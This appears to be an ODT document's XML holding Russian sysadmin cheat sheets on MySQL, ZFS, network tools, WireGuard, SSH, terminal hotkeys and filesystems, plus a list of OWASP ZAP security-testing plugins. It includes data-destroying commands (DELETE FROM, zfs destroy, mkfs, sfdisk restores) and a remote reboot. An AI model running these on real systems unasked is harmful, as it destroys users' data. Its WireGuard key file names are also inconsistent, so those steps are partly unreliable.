      <text:p text:style-name="P1">To push the current branch and set the remote as upstream, use</text:p>
      <text:p text:style-name="P1">git push --set-upstream origin master</text:p>
      <text:p text:style-name="P1">➜ fuck</text:p>
      <text:p text:style-name="P1">git push --set-upstream origin master [enter/↑/↓/ctrl+c]</text:p>
      <text:p text:style-name="P1">Counting objects: 9, done.</text:p>
      <text:p text:style-name="P1">...</text:p>
      <text:p text:style-name="P1">Установка:</text:p>
      <text:p text:style-name="P1">На Ubuntu / Mint установите The Fuck с помощью следующих команд:</text:p>
      <text:p text:style-name="P1">sudo apt update</text:p>
      <text:p text:style-name="P1">sudo apt install python3-dev python3-pip python3-setuptools</text:p>
      <text:p text:style-name="P1">pip3 install thefuck --user</text:p>
      <text:p text:style-name="P1">На FreeBSD установите The Fuck с помощью следующих команд:</text:p>
      <text:p text:style-name="P1">pkg install thefuck</text:p>
      <text:p text:style-name="P1">На macOS или Linux установить The Fuck можно через Homebrew:</text:p>
      <text:p text:style-name="P4">brew install thefuck</text:p>
      <text:p text:style-name="P1">Шпаргалка основных команд mysql по работе с базой данных и таблицам. Здесь в компактном виде собраны основные команды администрирование сервера MySQL посредством консоли, позволяющие получить информацию о состоянии баз данных, таблиц, просмотреть их структуру:</text:p>
      <text:p text:style-name="P1">SHOW DATABASES; - список баз данных</text:p>
      <text:p text:style-name="P1">SHOW TABLES [FROM db_name]; - список таблиц в базе</text:p>
      <text:p text:style-name="P1">SHOW COLUMNS FROM таблица [FROM db_name]; - список столбцов в таблице</text:p>
      <text:p text:style-name="P1">SHOW CREATE TABLE table_name; - показать структуру таблицы в формате «CREATE TABLE»</text:p>
      <text:p text:style-name="P1">DESC table_name; - узнать полную структуру таблицы</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">SHOW INDEX FROM tbl_name; - список индексов</text:span></text:p>
      <text:p text:style-name="P1">SHOW GRANTS FOR user [FROM db_name]; - привилегии для пользователя.</text:p>
      <text:p text:style-name="P1">SHOW VARIABLES; - значения системных переменных</text:p>
      <text:p text:style-name="P1">SHOW [FULL] PROCESSLIST; - статистика по mysqld процессам</text:p>
      <text:p text:style-name="P1">SHOW STATUS; - общая статистика</text:p>
      <text:p text:style-name="P1">SHOW TABLE STATUS [FROM db_name]; - статистика по всем таблицам в базе</text:p>
      <text:p text:style-name="P1">USE db_name; - использовать базу данных, для которой будут выполнятся дальнейшие запросы</text:p>
      <text:p text:style-name="P1">DELETE FROM table_name; - удалить все записи из таблицы. Сначала нужно выполнить USE db_name;</text:p>
      <text:p text:style-name="P1">SELECT * FROM table_name; - просмотр всех записей из таблицы</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P1">Шпаргалка по ZFS:</text:p>
      <text:p text:style-name="P1">modinfo zfs | head -n 9 - узнать версию ZFS и другие подробности</text:p>
      <text:p text:style-name="P1">Информация о пулах / файловых системах (ФС) на пулах:</text:p>
      <text:p text:style-name="P1">zpool list - статус пулов</text:p>
      <text:p text:style-name="P13">zpool status -v - статус пулов подробный</text:p>
      <text:p text:style-name="P13">zfs list - список ФС, так называются монтируемые разделы в пулах</text:p>
      <text:p text:style-name="P1">zfs get all - вся инфа по пулам, вообще вся</text:p>
      <text:p text:style-name="P1">Управление пулами / дисками:</text:p>
      <text:p text:style-name="P1">ls -lha /dev/disk/by-id/ - выяснить айдишники дисков чтобы потом на них создать пул (будут проблемы если подцепишь по буквенному названию диска типа sda, они динамически меняются)</text:p>
      <text:p text:style-name="P1">zpool create zfspool disk-id-1 disk-id-2 - может быть сколько угодно дисков, с ключом -f форсить создание пула</text:p>
      <text:p text:style-name="P1">zpool create -m /mnt/backups zfspool disk-id-1 - создать пул с указанием папки маунтирования</text:p>
      <text:p text:style-name="P1">zpool destroy zfspool - уничтожить пул zfspool, с ключом -f форсить уничтожение</text:p>
      <text:p text:style-name="P1">mkfile 100m disk1 disk2 - создать файлы дисков</text:p>
      <text:p text:style-name="P1">zpool create backups /disk1 /disk2- создать пул backups на созданных файлах</text:p>
      <text:p text:style-name="P1">zpool create zfspool mirror /disk1 /disk2 - создать пул zfspool с зеркалированием на 2 диска</text:p>
      <text:p text:style-name="P1">zpool add zfspool /disk3 - добавить диск в пул</text:p>
      <text:p text:style-name="P1">zpool attach zfspool /disk3 - добавить устройство в пул, если он в зеркале то станет в зеркало, если простой, то пул расширится</text:p>
      <text:p text:style-name="P1">zpool remove zfspool mirror-1</text:p>
      <text:p text:style-name="P1">zpool detach zfspool /disk3 - исключить устройство из пула</text:p>
      <text:p text:style-name="P1">zpool remove zfspool /disk3 - удаление устройства из пула</text:p>
      <text:p text:style-name="P1">zpool add zfspool spare /disk3 - добавление диска горячей замены в пул</text:p>
      <text:p text:style-name="P1">zpool remove zfspool spare /disk3 - удаление диска горячей замены из пула</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">zpool offline zfspool /disk1 - отключить устройство, на него не будет никакой записи и с него чтения, если добавить ключ -t, то после ребута станет онлайн</text:span></text:p>
      <text:p text:style-name="P1">zpool online zfspool /disk1 - включить disk1</text:p>
      <text:p text:style-name="P1">zpool replace zfspool /disk1 /disk3 - заменить disk 1, например в случае неисправности на disk3</text:p>
      <text:p text:style-name="P1">zpool upgrade -v - увидеть версию, и фичи текущего ZFS, -a обновит все пулы до новейшей версии</text:p>
      <text:p text:style-name="P1">Создание ФС и свойства ФС:</text:p>
      <text:p text:style-name="P1">zfs create zfspool/data - создать ФС data</text:p>
      <text:p text:style-name="P1">zfs create zfspool/backups создать ФС backups, обе ФС будут бесконтрольно расти, пока не выставлены квоты</text:p>
      <text:p text:style-name="P1">zfs destroy -fr zfspool/backups/old - уничтожит ФС old, ключ -r - рекурсивно, если внутри ещё несколько ФС, -f - форсить</text:p>
      <text:p text:style-name="P1">zfs set reservation=1G zfspool/data - зарезервировать 1 Гигабайт, который ФС гарантированно получит, а другие не займут</text:p>
      <text:p text:style-name="P1">zfs list -o quota zfspool/backups - выяснить квоту в пуле на ФС backups</text:p>
      <text:p text:style-name="P1">zfs set quota=1G zfspool/backups - установить квоту в 1 Гигабайт на ФС backups</text:p>
      <text:p text:style-name="P1">zfs list -o compression - проверить включена компрессия или нет</text:p>
      <text:p text:style-name="P1">zfs set compression=on zfspool/backups - включить компрессию на ФС backups в пуле zfspool</text:p>
      <text:p text:style-name="P23">zfs set sharesmb=on zfspool/backups - расшарить по SMB ФС backups средствами ZFS</text:p>
      <text:p text:style-name="P23">zfs set sharenfs=on zfspool/backups - расшарить по NFS ФС backups средствами ZFS</text:p>
      <text:p text:style-name="P1">Маунт:</text:p>
      <text:p text:style-name="P1">zfs mount - отобразить все маунтированные ФС</text:p>
      <text:p text:style-name="P1">zfs mount zfspool/backups - маунт ФС backups</text:p>
      <text:p text:style-name="P1">zfs umount zfspool/backups - анмаунт ФС backups</text:p>
      <text:p text:style-name="P1">zfs mount -a - маунт всех ФС ZFS</text:p>
      <text:p text:style-name="P1">zfs umount -a Umount - анмаунт всех ФС ZFS</text:p>
      <text:p text:style-name="P1">Снапшоты:</text:p>
      <text:p text:style-name="P1">zfs list -t snapshot - отобразить все снапшоты</text:p>
      <text:p text:style-name="P1">zfs list -o space - сколько занимают места снапшоты и конкретные дети пулов</text:p>
      <text:p text:style-name="P1">zfs snapshot zfspool/backups@test - создать снапшот ФС backups с названием test</text:p>
      <text:p text:style-name="P1">zfs rollback zfspool/backups@test - вернуться к снапшоту backups с названием test, с ключом -r рекурсивно уничтожит промежуточные снапшоты, с ключом -f форсит анмаунт и ремаунт</text:p>
      <text:p text:style-name="P1">zfs destroy zfspool/backups@test - уничтожить снапшот backups с названием test</text:p>
      <text:p text:style-name="P1">zfs send zfspool/backups@march2021 &gt; /home/backups/march2021.bak - сделать локальный бекап снапшота march2021</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">zfs receive zfspool2/backups2 &lt; /home/backups/march2021.bak - Восстановить из локального снапшота ФС на другом пуле</text:span></text:p>
      <text:p text:style-name="P1">zfs send zfspool/backups@march2021 | zfs receive zfspool2/backups2 - Комбо предыдущих двух</text:p>
      <text:p text:style-name="P1">zfs send zfspool/backups@march2021 | ssh COMP02 “zfs receive testpool/testfs” - Отправить снапшот по SSH на хост COMP02</text:p>
      <text:p text:style-name="P1">zfs clone zfspool/backups@march2021 /clones/backups - Клонировать существующий снапшот</text:p>
      <text:p text:style-name="P4">zfs destroy zfspool/backups@march2021 - Уничтожить клон</text:p>
      <text:p text:style-name="P1">Векторные базы данных (часть 1): что отличает каждую из них? https://thedataquarry.com/posts/vector-db-1/</text:p>
      <text:p text:style-name="P1">Векторные базы данных (часть 2): понимание их внутреннего устройства https://thedataquarry.com/posts/vector-db-2/</text:p>
      <text:p text:style-name="P1">Векторные базы данных (часть 3): не все индексы одинаковы https://thedataquarry.com/posts/vector-db-3/</text:p>
      <text:p text:style-name="P4">Векторные базы данных (часть 4): анализ компромиссов https://thedataquarry.com/posts/vector-db-4/</text:p>
      <text:p text:style-name="P1">Полезные сетевые утилиты linux:</text:p>
      <text:p text:style-name="P23">ip: Утилита управляет интерфейсами, сетевыми устройствами и туннелями. Всем сетевым стеком linux. Например: ip addr - Покажет список всех сетевых адресов. Тоже самое делает утилита ifconfig без параметров. ip route - Покажет таблицу роутинга. Тоже самое сделает команда route. ip link set eth0 up - Поднимает интерфейс eth0. Это можно также сделать с помощью ifconfig. Так зачем она нужна если все ее команды можно выполнить с помощью других утилит? Дело в том, что во многие компактные дистрибутивы (например Alpine или openwrt) не используют ifconfig, route и другие “большие” утилит. Там оставляют только ip. Вот с помощью нее и придется выполнять все сетевые задачи.</text:p>
      <text:p text:style-name="P23">nc: Полное имя netcat - на него она тоже откликается. Это утилита, позволяет слушать и выполнять TCP и UDP соединении. Открываем одно окно терминала и делаем там nc -l 12345 это будет наш сервер. Отрываем другое окно и пишем в нем nc 127.0.0.1 12345 - это наш клиент. Печатаем там “Hello!” нажимаем enter. В первом окне видим эту фразу. Ура! Мы написали однонаправленный чат. Эта утилита пригодиться чтобы проверить жив ли сервер и слушает ли от вообще на этом порту? С помощью nc можно переслать файл и даже просканировать порты. Http сервер еще можно написать.</text:p>
      <text:p text:style-name="P1">socat: Это труба, которая позволяет соединить два сокета между собой. Mysql слушает только на local socket а мы хотим на его ходить по tcp. Выглядит это так: socat TCP-LISTEN:3307,reuseaddr,fork UNIX-CONNECT:/var/lib/mysql/mysql.sock. Конектор к netcat из предыдущего примера: socat - TCP4:127.0.0.1:80. Если вам нужно перебросить сокет в другое место присмотритесь к socat он вам скорее всего поможет. </text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">netstat: Эта утилита показывает текущее состояние сетевого стека. Она даст вам ответ на вопросы: что у меня там на порту 9081 висит? netstat -nltp Что с моими tcp соединениями и кто прямо сейчас ко мне подключен? netstat -atp. У этой утилиты есть младший (или старший по возможностям) брат ss посмотрите на него тоже может он понравиться больше.</text:span></text:p>
      <text:p text:style-name="P4">curl: Утилита для передачи файлов. Так написано в ее описании. Чем же она замечательна? Она умеет кучу протоколов: DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP. В каждом протоколе она знает множество версий, например HTTP она может до версии 2. Умеет подставлять хидера, куки, ходить по SSL, использовать proxy разных видов. Можно отлаживать http(s) соединение с помощью -v. Примеры: curl http://artscene.textfiles.com/asciiart/unico; curl -v http://127.0.0.1:12345. Соединяемся с сервером из примера netcat. В консоле сервера увидим http запрос. После этого все остановиться curl будет ждать ответ. И если вы руками его введете покажет его.</text:p>
      <text:p text:style-name="P1">Как отлаживать bash-script-ы по шагам. Волшебная строчка, которую нужно добавить после #!/bin/bash, чтоб скрипт можно было отлаживать по шагам</text:p>
      <text:p text:style-name="P1">#!/bin/bash</text:p>
      <text:p text:style-name="P1">trap 'echo "# $BASH_COMMAND";read' DEBUG</text:p>
      <text:p text:style-name="P1">echo line1</text:p>
      <text:p text:style-name="P1">echo line2</text:p>
      <text:p text:style-name="P1">echo line3</text:p>
      <text:p text:style-name="P1">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Ингредиенты:</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 команда read, которая умеет ожидать ввода чего-нибудь с клавиатуры (в данном случае нам нужно только либо ENTER либо Ctrl+C переменная окружения $BASH_COMMAND, валидная внутри обработчика команды trap.</text:p>
      <text:p text:style-name="P23"># <text:s text:c="28"/>Online Bash Shell.</text:p>
      <text:p text:style-name="P23"># <text:s text:c="16"/>Code, Compile, Run and Debug Bash script online.</text:p>
      <text:p text:style-name="P1"># Write your code in this editor and press "Run" button to execute it.</text:p>
      <text:p text:style-name="P1">trap 'echo "# $BASH_COMMAND";read' DEBUG</text:p>
      <text:p text:style-name="P1">echo line1</text:p>
      <text:p text:style-name="P1">echo line2</text:p>
      <text:p text:style-name="P1">echo line3</text:p>
      <text:p text:style-name="P4">echo "Hello World";</text:p>
      <text:p text:style-name="P1">ТОП-10 <text:s/>плагинов для OWASP ZAP:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Access Control Testing: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/access-control-testing/)Позволяет (https://www.zaproxy.org/docs/desktop/addons/access-control-testing/) проводить тестирование контроля доступа и выявлять потенциальные проблемы с контролем доступа. </text:span></text:p>
      <text:p text:style-name="P1">Advanced SQLInjection Add-on: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/advanced-sqlinjection-scanner/)Инструмент (https://www.zaproxy.org/docs/desktop/addons/advanced-sqlinjection-scanner/) активного сканирования для обнаружения SQLi (на основе SQLMap).</text:p>
      <text:p text:style-name="P1">Attack Surface Detector: <text:s/>(https://github.com/secdec/attack-surface-detector-zap/wiki)Плагин (https://github.com/secdec/attack-surface-detector-zap/wiki) помогает выявить конечные точки веб-приложения, параметры, которые принимают эти конечные точки, и тип данных этих параметров.</text:p>
      <text:p text:style-name="P1">DOM XSS Active Scan Rule: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/dom-xss-active-scan-rule/)Активный (https://www.zaproxy.org/docs/desktop/addons/dom-xss-active-scan-rule/) сканер для обнаружения уязвимостей DOM XSS.</text:p>
      <text:p text:style-name="P1">Directory List v2.3: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/directory-list-v2.3/)Предоставляет (https://www.zaproxy.org/docs/desktop/addons/directory-list-v2.3/) файлы с именами каталогов для брутфорса или фаззинга.</text:p>
      <text:p text:style-name="P1">Eval Villain: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/eval-villain/)Расширение (https://www.zaproxy.org/docs/desktop/addons/eval-villain/) для ZAP и Firefox, которое будет подключаться к опасным функциям, таким как eval, и предупреждать вас об их использовании.</text:p>
      <text:p text:style-name="P1">GraphQL Support: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/graphql-support/)Плагин (https://www.zaproxy.org/docs/desktop/addons/graphql-support/) для получения структуры и запросов GraphQL.</text:p>
      <text:p text:style-name="P1">Out-of-band Application Security Testing Support: <text:s/>(https://www.zaproxy.org/docs/desktop/addons/oast-support/)Сервер (https://www.zaproxy.org/docs/desktop/addons/oast-support/) OAST для обнаружения внешних и слепых уязвимостей. Аналог Burp Collaborator, только для ZAP.</text:p>
      <text:p text:style-name="P1">HUNT v2: <text:s/>(https://github.com/bugcrowd/HUNT/tree/master/Remix)Выполняет (https://github.com/bugcrowd/HUNT/tree/master/Remix) пассивное сканирование на наличие потенциально уязвимых параметров.</text:p>
      <text:p text:style-name="P1">Community-scripts: (https://github.com/zaproxy/community-scripts) Большая (https://github.com/zaproxy/community-scripts) коллекция скриптов ZAP предоставленная комьюнити</text:p>
      <text:p text:style-name="P17">Как настроить VPN-сервер WireGuard на CentOS: Шаг 1. Установка сервера WireGuard на CentOS</text:p>
      <text:p text:style-name="P1">sudo yum update </text:p>
      <text:p text:style-name="P1">sudo dnf update</text:p>
      <text:p text:style-name="P1">Добавьте репозитории EPEL и Elrepo для установки модулей ядра и инструментов WireGuard.</text:p>
      <text:p text:style-name="P1">sudo dnf install epel-release elrepo-release -y</text:p>
      <text:p text:style-name="P1">Убедимся, что у нас включены репозиторий PowerTools, так как пакеты EPEL могут зависеть от пакетов из него:</text:p>
      <text:p text:style-name="P1">sudo yum install 'dnf-command(config-manager)'</text:p>
      <text:p text:style-name="P1">sudo yum config-manager --set-enabled PowerTools</text:p>
      <text:p text:style-name="P1">Прежде чем мы сможем установить модуль ядра WireGuard, включим его официальный репозиторий:</text:p>
      <text:p text:style-name="P1">sudo yum copr enable jdoss/wireguard</text:p>
      <text:p text:style-name="P1">Теперь установим WireGuard:</text:p>
      <text:p text:style-name="P1">sudo yum install wireguard-dkms wireguard-tools</text:p>
      <text:p text:style-name="P1">Шаг 2. Генерация закрытого и открытого ключей. Перейдите в каталог:</text:p>
      <text:p text:style-name="P1">cd /etc/wireguard</text:p>
      <text:p text:style-name="P1">Установите разрешение на эту директорию:</text:p>
      <text:p text:style-name="P1">umask 077</text:p>
      <text:p text:style-name="P1">Чтобы сгенерировать пару ключей:</text:p>
      <text:p text:style-name="P1">wg genkey | tee private.key | wg pubkey &gt; public.key</text:p>
      <text:p text:style-name="P1">Чтобы просмотреть сгенерированные ключи:</text:p>
      <text:p text:style-name="P1">ls -l privatekey publickey</text:p>
      <text:p text:style-name="P1">sudo cat privatekey</text:p>
      <text:p text:style-name="P1">Обязательно запишите этот ключ, он понадобиться нам далее:</text:p>
      <text:p text:style-name="P1">sudo cat publickey</text:p>
      <text:p text:style-name="P1">Шаг 3. Настройка серверной конфигурации. Чтобы начать настройку сервера WireGuard, перейдите в папку /etc/wireguard и создайте файл wg0.conf</text:p>
      <text:p text:style-name="P1">sudo nano /etc/wireguard/wg0.conf</text:p>
      <text:p text:style-name="P1">Добавьте в файл конфигурации следующие директивы и заполните данные созданными до этого ключами:</text:p>
      <text:p text:style-name="P1">[Interface]</text:p>
      <text:p text:style-name="P1">PrivateKey = &lt;contents-of-server-privatekey&gt;</text:p>
      <text:p text:style-name="P1">Address = 10.0.0.1/24</text:p>
      <text:p text:style-name="P1">PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</text:p>
      <text:p text:style-name="P1">PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE</text:p>
      <text:p text:style-name="P1">ListenPort = 51820</text:p>
      <text:p text:style-name="P1">[Peer]</text:p>
      <text:p text:style-name="P1">PublicKey = &lt;contents-of-client-publickey&gt;</text:p>
      <text:p text:style-name="P1">AllowedIPs = 10.0.0.2/32</text:p>
      <text:p text:style-name="P1">Скопируйте закрытый ключ, который мы сгенерировали ранее, и вставьте его в PrivateKey.</text:p>
      <text:p text:style-name="P17">Аналогично нужно сгенерировать пару ключей для клиента, скопируйте открытый ключ клиента и вставьте его в PublicKey. Чтобы скопировать значение ключа, выполните следующую команду:</text:p>
      <text:p text:style-name="P1">sudo cat /etc/wireguard/public.key</text:p>
      <text:p text:style-name="P1">sudo cat /etc/wireguard/private.key</text:p>
      <text:p text:style-name="P1">Шаг 4. Настройка FireWall:</text:p>
      <text:p text:style-name="P1">sudo firewall-cmd --add-interface=wg0 --zone=internal</text:p>
      <text:p text:style-name="P1">sudo firewall-cmd --permanent --zone=internal --add-masquerade</text:p>
      <text:p text:style-name="P1">Шаг 5. Запуск WireGuard и включение его при загрузке:</text:p>
      <text:p text:style-name="P4">wg-quick up wg0</text:p>
      <text:p text:style-name="P1">Горячие клавиши для работы в терминале Linux. Перемещение по строке:</text:p>
      <text:p text:style-name="P1">← , → или Ctrl + b, Ctrl + f Смещение курсора на один символ левее или правее.</text:p>
      <text:p text:style-name="P1">Ctrl + →, Ctrl + ←</text:p>
      <text:p text:style-name="P1">или</text:p>
      <text:p text:style-name="P1">Alt + b, Alt + f Смещение курсора на одно слово влево или вправо</text:p>
      <text:p text:style-name="P1">Ctrl + a, Home Установить курсор в начало строки</text:p>
      <text:p text:style-name="P1">Ctrl + e, End Установить курсор в конец строки</text:p>
      <text:p text:style-name="P1">Ctrl + xx Переход между двумя последними позициями курсора</text:p>
      <text:p text:style-name="P1">Сочетания клавиш для редактирования строки в терминале. Редактирование строки:</text:p>
      <text:p text:style-name="P1">Tab, Ctr + i Автодополнение команды или пути</text:p>
      <text:p text:style-name="P1">Tab, tab или Alt + ?(Shift+/) Представление вариантов автодополнения</text:p>
      <text:p text:style-name="P1">Backspace, Ctrl + h Удаление символа перед курсором</text:p>
      <text:p text:style-name="P1">Ctrl + d Удалить символ за курсором</text:p>
      <text:p text:style-name="P1">Ctrl + w или Alt + Backspace Удалить все символы от курсора до пробела слева</text:p>
      <text:p text:style-name="P1">Alt + d, Esc + d Удалить символы от курсора до конца слова</text:p>
      <text:p text:style-name="P1">Ctrl + y Вставить слова, которые были удалены с помощью Alt+d, Ctrl+w</text:p>
      <text:p text:style-name="P1">Alt + \ Удалить любое количество пробелов вместе, где стоит курсор.</text:p>
      <text:p text:style-name="P1">Alt + r, Esc + r Отменить все изменения внесенные в строку</text:p>
      <text:p text:style-name="P1">Alt + c Изменить регистр буквы под курсором на заглавный и переместить курсор в конец слова</text:p>
      <text:p text:style-name="P1">Alt + u Изменить регистр всех букв от курсора до конца слова на верхний регистр</text:p>
      <text:p text:style-name="P1">Alt + l Изменить регистр всех букв от курсора до конца слова на нижний регистр</text:p>
      <text:p text:style-name="P1">Alt + t Поменять местами слово под курсором и предыдущее слово</text:p>
      <text:p text:style-name="P1">Ctr + t Переместить символ перед курсором под курсор</text:p>
      <text:p text:style-name="P1">Ctrl + _(Sift+-) Откат редактирования (Undo)</text:p>
      <text:p text:style-name="P1">Сочетания клавиш для просмотра истории команд. История команд:</text:p>
      <text:p text:style-name="P1">Ctrl + r Поиск ранее введенной команды в истории</text:p>
      <text:p text:style-name="P1">↑, ↓ или Ctrl + p, Ctrl + n Перемещение по истории ранее введенных команд и путей</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Ctrl + o Вызвать последнею введенную команду</text:span></text:p>
      <text:p text:style-name="P1">Alt + . или Esc + . Вставить аргумент команды, выполненной ранее</text:p>
      <text:p text:style-name="P23">Alt + &lt; (Shift+,) Повторить первую команду в буфере истории</text:p>
      <text:p text:style-name="P23">Сочетания клавиш для управления выводом информации на экран. Вывод на экран:</text:p>
      <text:p text:style-name="P1">Ctrl + l Очистка окна терминала</text:p>
      <text:p text:style-name="P1">Ctrl + s Заморозить терминал</text:p>
      <text:p text:style-name="P1">Ctrl + q Продолжить работу терминала</text:p>
      <text:p text:style-name="P1">Ctrl + c Прервать работу терминальной утилиты</text:p>
      <text:p text:style-name="P1">Ctrl + z Перевести работу терминальной утилиты в фоновый режим</text:p>
      <text:p text:style-name="P4">Ctrl + d Выйти из командной оболочки bash</text:p>
      <text:p text:style-name="P1">Cамые нужные команд SSH. Чтобы выполнить всего одну удаленную команду, совсем не обязательно подключаться к SSH, вводить команду, а затем отключаться. Можно сделать это сразу. Например, так можно посмотреть заполненность ФС удаленной машины:</text:p>
      <text:p text:style-name="P1">$ ssh user@host df -h</text:p>
      <text:p text:style-name="P1">А такперезагрузить ее:</text:p>
      <text:p text:style-name="P1">$ ssh user@host sudo reboot</text:p>
      <text:p text:style-name="P1">Составляй списки команд и запускай их разом. Если у тебя есть целый список команд, которые следует выполнить, их можно записать в файл и скормить этот файл SSH:</text:p>
      <text:p text:style-name="P1">$ ssh user@host "`cat file.txt`"</text:p>
      <text:p text:style-name="P1">Редактируй удаленные файлы локальным редактором. Чтобы отредактировать файл на удаленной машине, не требуется заходить на нее и использовать консольный редактор. На самом деле файл можно открыть в твоем любимом текстовом редакторе на локальной машине (gvim заменяем на свой редактор):</text:p>
      <text:p text:style-name="P1">$ gvim scp://user@host//путь/к/файлу</text:p>
      <text:p text:style-name="P1">Копируй содержимое удаленного файла в буфер обмена. Если необходимо скопировать содержимое удаленного файла или вывод команды в буфер обмена, не обязательно выводить его на экран или открывать в текстовом редакторе и копировать вручную. Можно использовать следующую команду:</text:p>
      <text:p text:style-name="P1">$ ssh user@host cat /путь/к/файлу | xclip</text:p>
      <text:p text:style-name="P1">А так можно скопировать вывод команды:</text:p>
      <text:p text:style-name="P1">$ ssh user@host uname -a | xclip</text:p>
      <text:p text:style-name="P1">Сравнивай удаленный и локальный файл без копирования. Похожий прием можно использовать для сравнения двух файлов:</text:p>
      <text:p text:style-name="P1">$ ssh user@host cat /путь/к/удаленному/файлу | diff /путь/к/лoкальному/файлу -</text:p>
      <text:p text:style-name="P1">Работай с удаленными файлами с помощью локального файлового менеджера. Не всегда удобно работать с большим количеством файлов с помощью консольных команд или mc, запущенного на удаленной машине. Но всегда можно подключить любой каталог удаленной машины как сетевой диск. Для этого достаточно установить sshfs:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">$ sudo apt-get install sshfs</text:span></text:p>
      <text:p text:style-name="P1">Создать каталог для подключения «сетевого диска»:</text:p>
      <text:p text:style-name="P1">$ mkdir remote_files</text:p>
      <text:p text:style-name="P1">И подключить его:</text:p>
      <text:p text:style-name="P1">$ sshfs user@host:/home/user ~/remote_files/</text:p>
      <text:p text:style-name="P23">Теперь все файлы удаленного каталога /home/user будут видны в каталоге ~/remote_files/ и с ними можно работать, как с обычными.</text:p>
      <text:p text:style-name="P23">Копируй ключи быстро. Хоть и копирование публичного ключа на удаленный серверзадача простая, но она требует выполнения нескольких действий вручную. Если тебя это напpягает, скопировать ключ можно в автоматическом режиме:</text:p>
      <text:p text:style-name="P1">$ ssh-copy-id user@host</text:p>
      <text:p text:style-name="P1">При этом не обязательно копировать основной ключ, с помощью флага -i можно указать любой другой:</text:p>
      <text:p text:style-name="P1">$ ssh-copy-id -i ~/my_key.pub user@host</text:p>
      <text:p text:style-name="P1">Создай постоянное соединение с машиной. Если в течение дня ты часто подключаешься к одной машине, в том числе на несколько минут или секунд (чтобы просто запустить одну команду, например), есть смысл создать с ней постоянное соединение. Твой комп будет держать соединение открытым и использовать его для каждого подключения к машине. Это намного быстрее и экономичнее с точки зрения трафика и нагрузки на процессор. Добавь следующие строки в ~/.ssh/config:</text:p>
      <text:p text:style-name="P1">Host host</text:p>
      <text:p text:style-name="P1">ControlPath ~/.ssh/master-%r@%h:%p</text:p>
      <text:p text:style-name="P1">ControlMaster no</text:p>
      <text:p text:style-name="P1">А затем создай соединение:</text:p>
      <text:p text:style-name="P4">$ ssh -MNf user@host</text:p>
      <text:p text:style-name="P24"><text:span text:style-name="T3">Файловые системы \ FS \ sfdisk \ e2label \ mkfs \: ext3 - Наиболее распространенная файловая система Linux, предоставляющая возможность журналирования с целью сохранения данных и возможность быстро перезагружать систему после некорректного завершения ее работы. ext2 - Файловая система, предшествующая ext3, не поддерживающая функцию журналирования. iso9660 - появилась из файловой системы High Sierra (была стандартом для компакт-дисков) и может содержать расширения Rock Ridge для обеспечения возможности использования длинных имен файлов и других функций (полномочия доступа к файлу, права собственности и ссылки). jffs2 - Журналируемая файловая система для флэш-носителей, созданная для эффективной работы с USB-накопителями. jfs - Файловая система, используемая на IBM в OS/2 Warp и настроенная на работу с большими файловыми системами и средами с высокой производительностью. msdos - Может использоваться для монтирования файловых систем на устаревшие носители MS-DOS, например старые дискеты. ntfs - Может быть полезна, когда есть необходимость передавать файлы в файловые системы Windows (с двойной загрузкой или на сменных носителях). reiserfs - Журналируемая файловая </text:span><text:soft-page-break/><text:span text:style-name="T3">система, иногда используемая по умолчанию на SUSE, Slackware и других операционных системах Linux. squashfs - Запакованная файловая система, предназначенная только для чтения данных и используемая на многих Live CD Linux. swap - Используется на разделах подкачки для временного хранения данных, когда оперативная память временно недоступна. ufs - Популярная файловая система операционных систем Solaris и SunOS от корпорации Sun Microsystems. vfat - Расширенная файловая система FAT (VFAT), которая полезна, если файловым системам нужно обмениваться файлами с более старыми системами Windows (с двойной загрузкой или на сменных носителях). xfs - Журналируемая файловая система для среды с высокой производительностью, размер которой может расширяться до многих терабайт данных, а скорость передачи данных в которой исчисляется гигабайтами в секунду</text:span></text:p>
      <text:p text:style-name="P23">sfdisk - программа для работы с таблицей разделов жесткого диска</text:p>
      <text:p text:style-name="P1">sfdisk -d /dev/sda &gt; sda-table - Выполняет резервное копирование таблицы разбиения в файл </text:p>
      <text:p text:style-name="P1">sfdisk /dev/sda &lt; sda-table - Восстанавливает таблицу разбиения из файла</text:p>
      <text:p text:style-name="P1">sfdisk -d /dev/sda | sfdisk /dev/sdb - Копирует таблицу разбиения с одного диска на другой</text:p>
      <text:p text:style-name="P1">fdisk - <text:s/>программа для работы с таблицей разделов жесткого диска (устарела)</text:p>
      <text:p text:style-name="P1">e2label /dev/sda2 - посмотреть метку второго раздела</text:p>
      <text:p text:style-name="P1">e2label /dev/sda2 my_lable_name - <text:s/>назначить метку my_lable_name второму разделу</text:p>
      <text:p text:style-name="P1">findfs LABEL=my_lable_name - ищем раздел по метке (например в /etc/fstab монтирование по метке)</text:p>
      <text:p text:style-name="P1">mkfs -t ext3 /dev/sdb1 - Создает файловую систему ext3 на разделе sba1</text:p>
      <text:p text:style-name="P1">mkfs -t ext3 -v -c /dev/sdb1 - Расширенная команда, выполняющая также поиск поврежденных блоков </text:p>
      <text:p text:style-name="P1">mkfs.ext3 -с /dev/sdb1 - Создает файловую систему ext3 на разделе sba1</text:p>
      <text:p text:style-name="P1">mkfs.ext3 -с -L mypartition /dev/sdb1 - Создает файловую систему ext3 на разделе sba1 и добавляет разделу метку <text:s text:c="4"/></text:p>
